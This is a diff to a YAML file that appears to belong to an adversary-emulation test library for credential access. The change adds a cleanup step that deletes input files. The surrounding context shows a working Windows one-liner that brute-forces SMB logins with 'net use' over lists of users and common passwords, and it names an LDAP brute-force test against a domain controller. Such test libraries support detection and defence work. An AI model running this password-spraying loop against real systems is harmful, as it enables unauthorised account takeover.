@@ -4369,6 +4369,9 @@ credential-access:
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+        cleanup_command: |-
+          del #{input_file_users}
+          del #{input_file_passwords}
     - name: Brute Force Credentials of single domain user via LDAP against domain
         controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
